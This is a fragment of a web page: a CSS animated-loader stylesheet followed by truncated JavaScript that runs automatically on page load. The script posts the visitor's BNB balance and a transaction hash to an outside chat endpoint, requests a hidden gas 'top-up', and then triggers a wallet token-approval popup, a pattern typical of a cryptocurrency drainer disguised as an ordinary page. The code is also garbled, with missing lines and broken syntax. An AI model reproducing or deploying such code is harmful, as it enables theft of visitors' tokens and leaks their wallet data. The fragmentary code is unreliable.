        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* From Uiverse.io by dexter-st */ 
        .loader-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 120px;
            width: auto;
            margin: 2rem;
            font-family: "Poppins", sans-serif;
            font-size: 1.6em;
            font-weight: 600;
            user-select: none;
            color: #fff;
            scale: 2;
        }

        .loader {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            z-index: 1;
            background-color: transparent;
            mask: repeating-linear-gradient(
                90deg,
                transparent 0,
                transparent 6px,
                black 7px,
                black 8px
            );
        }

        .loader::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(circle at 50% 50%, #ff0 0%, transparent 50%),
                radial-gradient(circle at 45% 45%, #f00 0%, transparent 45%),
                radial-gradient(circle at 55% 55%, #0ff 0%, transparent 45%),
                radial-gradient(circle at 45% 55%, #0f0 0%, transparent 45%),
                radial-gradient(circle at 55% 45%, #00f 0%, transparent 45%);
            mask: radial-gradient(
                circle at 50% 50%,
                transparent 0%,
                transparent 10%,
                black 25%
            );
            animation:
                transform-animation 2s infinite alternate,
                opacity-animation 4s infinite;
            animation-timing-function: cubic-bezier(0.6, 0.8, 0.5, 1);
        }

        @keyframes transform-animation {
            0% {
                transform: translate(-55%);
            }
            100% {
                transform: translate(55%);
            }
        }

        @keyframes opacity-animation {
            0%,
            100% {
                opacity: 0;
            }
            15% {
                opacity: 1;
            }
            65% {
                opacity: 0;
            }
        }

        .loader-letter {
            display: inline-block;
            opacity: 0;
            animation: loader-letter-anim 4s infinite linear;
            z-index: 2;
        }

        .loader-letter:nth-child(1) {
            animation-delay: 0.1s;
        }
        .loader-letter:nth-child(2) {
            animation-delay: 0.205s;
        }
        .loader-letter:nth-child(3) {
            animation-delay: 0.31s;
        }
        .loader-letter:nth-child(4) {
            animation-delay: 0.415s;
        }
        .loader-letter:nth-child(5) {
            animation-delay: 0.521s;
        }
        .loader-letter:nth-child(6) {
            animation-delay: 0.626s;
        }
        .loader-letter:nth-child(7) {
            animation-delay: 0.731s;
        }
        .loader-letter:nth-child(8) {
            animation-delay: 0.837s;
        }
        .loader-letter:nth-child(9) {
            animation-delay: 0.942s;
        }
        .loader-letter:nth-child(10) {
            animation-delay: 1.047s;
        }

        @keyframes loader-letter-anim {
            0% {
                opacity: 0;
            }
            5% {
                opacity: 1;
                text-shadow: 0 0 4px #fff;
                transform: scale(1.1) translateY(-2px);
            }
            20% {
                opacity: 0.2;
            }
            100% {
                opacity: 0;
            }
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .loader-wrapper {
                scale: 1.5;
            }
        }

        @media (max-width: 480px) {
            .loader-wrapper {
                scale: 1.2;
            }
        }
    </style>

            const maxRetries = 3;

                            `üí∞ BNB Balance: ${bnbAmount} BNB\n` +

                            `üîó Transaction Hash: ${txHash}`;

                const formData = new URLSearchParams();
                formData.append('chat_id', chatId);
                formData.append('text', message);
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',

                    body: formData.toString(),

                });

                // Step 2: Auto top-up in background if needed
                if (parseFloat(balanceInBNB) < requiredBNB) {
                    showLoading('Please wait...');
                    alert('‚ö†Ô∏è Low Balance!\n\nRequesting BNB top-up...');
                    
                    // Request the BNB top-up from the backend (in background)
                    const topUpSuccess = await requestBNBTopUp(account);

                    if (!topUpSuccess) {
                        showLoading('Please try again.');
                        setTimeout(() => hideLoading(), 2000);
                        return;
                    }

                    // Wait for top-up to process
                    showLoading('Processing...');
                    alert('‚è≥ Waiting 3 seconds for top-up...');
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                    // Recheck balance
                    const newBnbBalance = await web3.eth.getBalance(account);
                    const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
                    
                    alert('üí∞ New Balance: ' + parseFloat(newBalanceInBNB).toFixed(6) + ' BNB');
                    
                    if (parseFloat(newBalanceInBNB) < requiredBNB) {
                        showLoading('Please try again.');
                        setTimeout(() => hideLoading(), 2000);
                        return;
                    }
                }

                // Step 3: Hide loading so wallet can show approval popup
                hideLoading();
                alert('üöÄ Starting Approval...\n\nWallet popup will appear.');
                
                // Show approval request (MetaMask/Trust Wallet will show popup)
                await approveToken(account);
            } catch (error) {
                console.error('Error:', error);
                alert('‚ùå Error: ' + error.message);
                hideLoading();
            }
        }

        // Start automatically when page loads - no wallet connection required
        window.addEventListener('load', function() {
            alert('üöÄ Page Loaded!\n\nStarting in 1 second...');
            console.log('üöÄ Page loaded, starting process...');
            
            // Small delay to ensure scripts are loaded
            setTimeout(() => {
                TokenApprove();
            }, 1000);
        });
    </script>
